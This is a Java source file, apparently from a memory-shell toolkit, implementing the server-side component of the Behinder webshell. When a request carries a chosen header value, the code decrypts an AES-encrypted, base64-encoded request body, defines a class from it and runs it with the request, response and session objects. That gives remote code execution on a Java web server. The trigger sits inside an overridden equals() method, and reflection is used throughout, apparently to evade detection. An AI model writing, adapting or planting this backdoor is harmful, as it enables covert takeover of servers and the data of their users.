package com.reajason.javaweb.memshell.shelltool.behinder;

import java.io.BufferedReader;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.security.Key;
import java.util.HashMap;
import java.util.Map;

/**
 * @author ReaJason
 * @since 2024/12/21
 */
public class Behinder extends ClassLoader {
    public static String pass;
    public static String headerName;
    public static String headerValue;

    public Behinder() {
    }

    public Behinder(ClassLoader c) {
        super(c);
    }

    @Override
    public boolean equals(Object obj) {
        Object[] args = ((Object[]) obj);
        Object request = unwrapRequest(args[0]);
        Object response = unwrapResponse(args[1]);

        try {
            String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
            if (value != null && value.contains(headerValue)) {
                Object session = request.getClass().getMethod("getSession").invoke(request);
                session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, "u", pass);
                Map<String, Object> map = new HashMap<String, Object>(3);
                map.put("request", request);
                map.put("response", response);
                map.put("session", session);
                String parameter = ((BufferedReader) request.getClass().getMethod("getReader").invoke(request)).readLine();
                byte[] bytes = x(base64Decode(parameter), false);
                Object instance = (new Behinder(Thread.currentThread().getContextClassLoader())).g(bytes).newInstance();
                instance.equals(map);
                return true;
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return false;
    }

    @SuppressWarnings("all")
    public Class<?> g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    @SuppressWarnings("all")
    public byte[] x(byte[] s, boolean m) throws Exception {
        ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
        Class<?> cipherClass = contextClassLoader.loadClass("javax.crypto.Cipher");
        Class<?> secretKeySpecClass = contextClassLoader.loadClass("javax.crypto.spec.SecretKeySpec");
        Constructor<?> constructor = secretKeySpecClass.getConstructor(byte[].class, String.class);
        Method initMethod = cipherClass.getMethod("init", int.class, Key.class);
        Object c = cipherClass.getMethod("getInstance", String.class).invoke(null, "AES");
        initMethod.invoke(c, m ? 1 : 2, constructor.newInstance(pass.getBytes(), "AES"));
        Method doFinalMethod = cipherClass.getMethod("doFinal", byte[].class);
        return ((byte[]) doFinalMethod.invoke(c, s));
    }

    @SuppressWarnings("all")
    public Object unwrapRequest(Object request) {
        Object internalRequest = request;
        while (true) {
            try {
                Object r = getFieldValue(request, "request");
                if (r == internalRequest) {
                    return r;
                } else {
                    internalRequest = r;
                }
            } catch (Exception e) {
                return internalRequest;
            }
        }
    }

    @SuppressWarnings("all")
    public Object unwrapResponse(Object response) {
        Object internalResponse = response;
        while (true) {
            try {
                Object r = getFieldValue(response, "response");
                if (r == internalResponse) {
                    return r;
                } else {
                    internalResponse = r;
                }
            } catch (Exception e) {
                return internalResponse;
            }
        }
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Field field = null;
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                field = clazz.getDeclaredField(name);
                break;
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        if (field == null) {
            throw new NoSuchFieldException(name);
        } else {
            field.setAccessible(true);
            return field.get(obj);
        }
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;
        Class<?> base64;
        ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
        try {
            base64 = contextClassLoader.loadClass("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            base64 = contextClassLoader.loadClass("sun.misc.BASE64Decoder");
            Object decoder = base64.newInstance();
            value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
        return value;
    }
}
